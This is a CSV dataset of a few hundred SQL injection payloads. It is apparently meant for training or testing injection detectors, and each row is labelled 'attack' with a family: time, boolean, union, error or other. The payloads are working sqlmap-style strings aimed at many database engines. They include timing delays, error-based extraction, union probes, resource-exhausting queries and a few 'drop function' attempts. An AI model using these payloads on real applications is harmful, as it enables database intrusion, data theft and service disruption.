label,payload,family
attack,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",time
attack,"1  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1""   )    )    as puws where 7006  =  7006",other
attack,"1"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack," select sleep  (  5  )   and   (  ""zsjw"" like ""zsjw",time
attack,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",union
attack,"1""  )   and elt  (  4249  =  4249,7259  )   and   (  ""upkx""  =  ""upkx",boolean
attack,-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,error
attack,if  (  9953  =  4347  )   select 9953 else drop function ocau--,other
attack,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'vcph'  =  'vcph",error
attack,"1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",boolean
attack,"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270",error
attack,1' and 9970  =  3409,boolean
attack,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx,other
attack,"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",error
attack,"1%""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,error
attack,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",boolean
attack,"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",boolean
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'ejuu' from dual where 2903  =  2903 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",boolean
attack,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",boolean
attack,1  )   where 2390  =  2390,other
attack,waitfor delay '0:0:5'-- thuo,time
attack,"-2929""   )    )     )   union all select 8999,8999#",union
attack,1'  )   where 5378  =  5378,other
attack,"1"" and   (  3020  =  3020  )  *6703",boolean
attack,"1""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",boolean
attack,1  )   where 8320  =  8320 waitfor delay '0:0:5'--,time
attack,"1%""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,boolean
attack,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868",error
attack,"1%' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '%'  =  '",boolean
attack,"-5313""   )    )     )   union all select 9189,9189,9189,9189,9189,9189,9189,9189--",union
attack,"1'||  (  select 'setd' from dual where 3686  =  3686   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",other
attack,"1""   )    )    as thoj where 1577  =  1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1' where 9216  =  9216,other
attack,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",union
attack,"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",other
attack,"1' in boolean mode  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""ouix""  =  ""ouix",boolean
attack,"1""  )   as giqb where 4664  =  4664",other
attack,1' and 7528  =  2894 and 'qoyw'  =  'qoyw,boolean
attack,"1%""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""%""  =  """,time
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'roca'  =  'roca",boolean
attack,"-3362' where 6567  =  6567 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",union
attack,"1"" and 9198  =  9198--",boolean
attack,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,boolean
attack,1'||  (  select 'hbho' from dual where 7193  =  7193,other
attack,1'   )    )     )   rlike sleep  (  5  )  #,time
attack,1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,boolean
attack,"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",union
attack,"-9439""  )   where 9460  =  9460 or   (  9497  =  9586  )  *9586--",boolean
attack,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'pemj'  =  'pemj,time
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'agsi'  =  'agsi",boolean
attack,"1%'   )    )     )   and elt  (  7425  =  3843,3843  )   and    (    (     (  '%'  =  '",boolean
attack,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,select   (  case when   (  1946  =  1302  )   then 1946 else 1/  (  select 0  )   end  )  --,other
attack, (  case when 6398  =  6398 then 1 else null end  ) ,other
attack,"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",boolean
attack,"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr",boolean
attack,1' and 7533  =  7533 and 'frvk'  =  'frvk,boolean
attack,"1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",boolean
attack,"-5362  )   union all select 7297,7297,7297,7297,7297#",union
attack,1'+  (  select kfmv where 1679  =  1679,other
attack,"1'  )   as taay where 7027  =  7027 and elt  (  4249  =  4249,7259  )  --",boolean
attack,-8234'   )    )     )   or 9323  =  9323#,boolean
attack,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,1'  )   where 6305  =  6305 rlike   (  select   (  case when   (  8326  =  9749  )   then 1 else 0x28 end   )    )   --,other
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,boolean
attack,"1%""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and ""%""  =  """,boolean
attack,"1' in boolean mode  )   and elt  (  4249  =  4249,7259  )  #",boolean
attack,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  -- dtha",error
attack,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   1476  =  1476,time
attack,1%'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  ',boolean
attack,"-4811%'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '%'  =  '",boolean
attack,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",boolean
attack,"1""  )   as wxea where 6394  =  6394 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",error
attack,"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab",boolean
attack,"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",boolean
attack,"1'  )   where 7646  =  7646 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-6389"" union all select 2355,2355,2355,2355,2355--",union
attack,"1""   )    )    as chal where 6661  =  6661",other
attack,1'   )    )    as iipj where 6560  =  6560,other
attack,"1""  )   or sleep  (  5  )   and   (  ""fiag"" like ""fiag",time
attack,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and 'ejdk' like 'ejdk,time
attack,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",union
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa",error
attack,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",boolean
attack,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",union
attack,-9363%' or   (  8459  =  8459  )  *4906 and '%'  =  ',boolean
attack,"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",boolean
attack,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union
attack,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",boolean
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'ahjo'  =  'ahjo",boolean
attack,-3044'  )   or 4999  =  3051#,boolean
attack,"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,boolean
attack,if  (  4735  =  8907  )   select 4735 else drop function qigo--,other
attack,"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",boolean
attack,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,select pg_sleep  (  5  )   and 'rpka'  =  'rpka,time
attack,"1""  )   as esks where 1138  =  1138",other
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'cipk'  =  'cipk",error
attack,-1700%' or 4149  =  3391#,boolean
attack,select   (  case when   (  9619  =  8679  )   then 1 else 9619*  (  select 9619 from master..sysdatabases  )   end  )  --,other
attack,1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,time
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  '%'  =  '",boolean
attack,-1621' in boolean mode  )   order by 1--,other
attack,"1""  )   as mibc where 3113  =  3113",other
attack,select   (  case when   (  5290  =  1720  )   then 5290 else 1/  (  select 0  )   end  )  --,other
attack,"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,boolean
attack,"1%'   )    )     )   union all select null,null#",union
attack,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",time
attack,-9739' or 8571  =  8571--,boolean
attack,1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',time
attack,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,time
attack,1  )   where 7159  =  7159,other
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",time
attack,"1'   )    )    as omwk where 1414  =  1414 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",union
attack,"1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",time
attack,"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time
attack,"1""  )   as qayu where 6222  =  6222 union all select null,null,null#",union
attack,"1  )   union all select null,null,null,null,null,null,null#",union
attack,"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",error
attack,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,1'+  (  select tdkt where 4535  =  4535,other
attack,1'  )   where 5145  =  5145,other
attack,"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,boolean
attack,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   'ckmm' like 'ckmm,time
attack,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'zypa'  =  'zypa",error
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,time
attack,"1'  )   where 9951  =  9951   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",time
attack,"1'   )    )    as icik where 1440  =  1440 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,select   (  case when   (  1412  =  5313  )   then 1412 else 1412*  (  select 1412 from mysql.db  )   end  )  #,other
attack,"-3737%"" union all select 4452,4452,4452#",union
attack,1'   )    )    and 3814  =  4272--,boolean
attack,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",time
attack,1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'hcpo' like 'hcpo,boolean
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",other
attack,"1""  )   where 2680  =  2680 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,"1"" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #",time
attack,select   (  case when   (  5198  =  2518  )   then 5198 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,error
attack,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,time
attack,select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,other
attack,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",union
attack,-8504 where 3086  =  3086 or 1131  =  9188#,boolean
attack,"1'  )   where 6772  =  6772 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",error
attack,1 where 6036  =  6036 and 7533  =  7533--,boolean
attack,1%'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',boolean
attack,-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,boolean
attack,1'   )    )    as pqbq where 1865  =  1865,other
attack,"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",boolean
attack,"1'   )    )    union all select null,null,null,null,null--",union
attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",boolean
attack,"-6611%""   )    )     )   union all select 8918,8918#",union
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""lzyl"" like ""lzyl",boolean
attack,"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1%' rlike sleep  (  5  )  #,time
attack,1%' or sleep  (  5  )   and '%'  =  ',time
attack,"1  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",boolean
attack,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'xuwl' like 'xuwl",boolean
attack,"-9156'   )    )    union all select 9110,9110,9110,9110#",union
attack,"1%'   )    )     )   and make_set  (  1543  =  5817,5817  )   and    (    (     (  '%'  =  '",boolean
attack,"1 where 7072  =  7072 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",error
attack,"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,1  )   where 8433  =  8433 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,"1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",error
attack,"-8640  )   or elt  (  7657  =  5020,5020  )   and   (  2346  =  2346",boolean
attack, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth,time
attack,"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""mejy""  =  ""mejy",boolean
attack,"-3775'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",error
attack,"1"" where 1234  =  1234",other
attack,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",time
attack,"-2424  )   where 8132  =  8132 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,"1%""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,error
attack,"1%'  )   and elt  (  4670  =  9403,9403  )   and   (  '%'  =  '",boolean
attack,"waitfor delay '0:0:5' and ""%""  =  """,time
attack, (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,other
attack,"1%""   )    )     )   union all select null,null,null#",union
attack,1  )   where 6725  =  6725 and 1553  =  7419,boolean
attack,"1""  )  ",other
attack,1' where 1557  =  1557,other
attack,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",union
attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'cxjp'  =  'cxjp",boolean
attack,"-2726""   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   ""ococ""  =  ""ococ",boolean
attack,"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'rqbf'  =  'rqbf",boolean
attack,1%' waitfor delay '0:0:5' and '%'  =  ',time
attack,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",time
